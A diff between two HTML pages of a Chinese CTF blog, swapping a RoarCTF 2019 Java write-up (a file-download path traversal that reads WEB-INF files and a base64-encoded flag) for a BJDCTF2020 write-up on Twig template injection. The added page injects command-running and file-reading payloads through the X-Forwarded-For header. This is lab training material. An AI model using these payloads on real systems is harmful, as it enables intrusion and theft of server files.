@@ -16,27 +16,26 @@
   <meta name="author" content="YY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[RoarCTF 2019]Easy Java进入是登录界面，  首先尝试登录，注入没有成功（当然因为是java没怎么尝试），发现下面的help，进入后路径是： 1http:&#x2F;&#x2F;6dd13dba-f7ac-40de-a4eb-56cad5c3403b.node4.buuoj.cn:81&#x2F;Download?filename&#x3D;help.docx  但是显示了java.io.FileNotFoundEx">
+    <meta name="description" content="[BJDCTF2020]The mystery of ip进入是一个页面  上面主要有两个选项，进入Flag，  只是显示了IP，没什么东西，看下Hint，在源代码中看到提示Do you know why i know your ip?，I don’t know. bp抓包，修改请求，添加X-Forwarded-For，发现IP变了，但是这样后面没什么头绪了。 查了下发现了PHP中的Twig模板注">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[ctf-web] RoarCTF2019-EasyJava">
-<meta property="og:url" content="https://s1n9l3.github.io/2022/12/15/[ctf-web]%20RoarCTF2019-EayaJava/index.html">
+<meta property="og:title" content="[ctf-web] BJDCTF2020-TheMysteryOfIp">
+<meta property="og:url" content="https://s1n9l3.github.io/2022/12/16/[ctf-web]%20BJDCTF2020-TheMysteryOfIp/index.html">
 <meta property="og:site_name" content="S1n9l3">
-<meta property="og:description" content="[RoarCTF 2019]Easy Java进入是登录界面，  首先尝试登录，注入没有成功（当然因为是java没怎么尝试），发现下面的help，进入后路径是： 1http:&#x2F;&#x2F;6dd13dba-f7ac-40de-a4eb-56cad5c3403b.node4.buuoj.cn:81&#x2F;Download?filename&#x3D;help.docx  但是显示了java.io.FileNotFoundEx">
+<meta property="og:description" content="[BJDCTF2020]The mystery of ip进入是一个页面  上面主要有两个选项，进入Flag，  只是显示了IP，没什么东西，看下Hint，在源代码中看到提示Do you know why i know your ip?，I don’t know. bp抓包，修改请求，添加X-Forwarded-For，发现IP变了，但是这样后面没什么头绪了。 查了下发现了PHP中的Twig模板注">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215221720796.png">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215222141955.png">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215222351095.png">
-<meta property="article:published_time" content="2022-12-15T14:16:15.394Z">
-<meta property="article:modified_time" content="2022-12-15T14:25:33.664Z">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212858904.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212932209.png">
+<meta property="article:published_time" content="2022-12-16T13:27:56.649Z">
+<meta property="article:modified_time" content="2022-12-16T13:34:31.732Z">
 <meta property="article:author" content="YY">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="ctf-web">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215221720796.png">
+<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212858904.png">
   
   
   
-  <title>[ctf-web] RoarCTF2019-EasyJava - S1n9l3</title>
+  <title>[ctf-web] BJDCTF2020-TheMysteryOfIp - S1n9l3</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="[ctf-web] RoarCTF2019-EasyJava"></span>
+            <span id="subtitle" data-typed-text="[ctf-web] BJDCTF2020-TheMysteryOfIp"></span>
           
         </div>
 
@@ -212,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-12-15 22:16" pubdate>
-          2022年12月15日 晚上
+        <time datetime="2022-12-16 21:27" pubdate>
+          2022年12月16日 晚上
         </time>
       </span>
     
@@ -224,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          410 字
         
       </span>
     
@@ -235,7 +234,7 @@
         
         
         
-          11 分钟
+          4 分钟
         
       </span>
     
@@ -273,28 +272,25 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">[ctf-web] RoarCTF2019-EasyJava</h1>
+            <h1 style="display: none">[ctf-web] BJDCTF2020-TheMysteryOfIp</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>进入是登录界面，</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215221720796.png" srcset="/img/loading.gif" lazyload alt="image-20221215221720796"></p>
-<p>首先尝试登录，注入没有成功（当然因为是java没怎么尝试），发现下面的help，进入后路径是：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">6</span>dd13dba-f7ac-<span class="hljs-number">40</span>de-a4eb-<span class="hljs-number">56</span>cad5c3403b.node4.buuoj.cn:<span class="hljs-number">81</span>/Download?filename=help.docx<br></code></pre></td></tr></table></figure>
+                <h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>进入是一个页面</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212858904.png" srcset="/img/loading.gif" lazyload alt="image-20221216212858904"></p>
+<p>上面主要有两个选项，进入Flag，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221216212932209.png" srcset="/img/loading.gif" lazyload alt="image-20221216212932209"></p>
+<p>只是显示了IP，没什么东西，看下Hint，在源代码中看到提示<code>Do you know why i know your ip?</code>，I don’t know.</p>
+<p>bp抓包，修改请求，添加<code>X-Forwarded-For</code>，发现IP变了，但是这样后面没什么头绪了。</p>
+<p>查了下发现了PHP中的<strong>Twig模板注入漏洞</strong>，类似Flask的J<strong>injia2模板注入漏洞</strong>，操作就是：</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>但是显示了<code>java.io.FileNotFoundException:&#123;help.docx&#125;</code>，不过尝试了发送POST请求成功下载文件，也不是POST请求，就是把请求方法换成了POST，在hackbar选择这个，</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215222141955.png" srcset="/img/loading.gif" lazyload alt="image-20221215222141955"></p>
-<p>打开文件发现只有<code>Are you sure the flag is here? ? ?</code>这样的内容，那么就尝试下载其他的文件，javaweb中有<code>/WEB-INF/web.xml</code>文件，尝试下载，成功了，打开发现</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221215222351095.png" srcset="/img/loading.gif" lazyload alt="image-20221215222351095"></p>
-<p>尝试下载这个文件：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">6</span>dd13dba-f7ac-<span class="hljs-number">40</span>de-a4eb-<span class="hljs-number">56</span>cad5c3403b.node4.buuoj.cn:<span class="hljs-number">81</span><span class="hljs-regexp">/Download?filename=/</span>WEB-INF<span class="hljs-regexp">/classes/</span>com<span class="hljs-regexp">/wm/</span>ctf/FlagController.class<br></code></pre></td></tr></table></figure>
+<p>执行命令，然后：</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">highlight_file</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>不过需要反编译，<a target="_blank" rel="noopener" href="http://javare.cn/">JAVA反向工程网 (javare.cn)</a></p>
-<p>得到源码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-meta">@WebServlet(</span><br><span class="hljs-meta">   name = &quot;FlagController&quot;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlagController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>   <span class="hljs-type">String</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ZmxhZ3swZTVmYjRiNy1lMzIzLTQ4NTQtOWUxNi0xMDVlNzE3OTEzZmF9Cg==&quot;</span>;<br><br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>      <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getWriter();<br>      var3.print(<span class="hljs-string">&quot;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>base64解码。</p>
+<p>得到flag。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13049923.html">SSTI（以Twig模板引擎为例） - My_Dreams - 博客园 (cnblogs.com)</a></p>
 
                 
               </div>
@@ -342,8 +338,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>[ctf-web] RoarCTF2019-EasyJava</div>
-      <div>https://s1n9l3.github.io/2022/12/15/[ctf-web] RoarCTF2019-EayaJava/</div>
+      <div>[ctf-web] BJDCTF2020-TheMysteryOfIp</div>
+      <div>https://s1n9l3.github.io/2022/12/16/[ctf-web] BJDCTF2020-TheMysteryOfIp/</div>
     </div>
     <div class="license-meta">
       
@@ -355,7 +351,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年12月15日</div>
+          <div>2022年12月16日</div>
         </div>
       
       
@@ -387,9 +383,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/12/16/%5Bctf-web%5D%20BJDCTF2020-TheMysteryOfIp/" title="[ctf-web] BJDCTF2020-TheMysteryOfIp">
+                      <a href="/2022/12/23/%5Bctf-web%5D%20BUUCTF2018-OnlineTools/" title="[ctf-web] BUUCTF2018-OnlineTool">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[ctf-web] BJDCTF2020-TheMysteryOfIp</span>
+                        <span class="hidden-mobile">[ctf-web] BUUCTF2018-OnlineTool</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -397,8 +393,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/14/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Fakebook/" title="[ctf-web] 网鼎杯2018-Fakebook">
-                        <span class="hidden-mobile">[ctf-web] 网鼎杯2018-Fakebook</span>
+                      <a href="/2022/12/15/%5Bctf-web%5D%20RoarCTF2019-EayaJava/" title="[ctf-web] RoarCTF2019-EasyJava">
+                        <span class="hidden-mobile">[ctf-web] RoarCTF2019-EasyJava</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
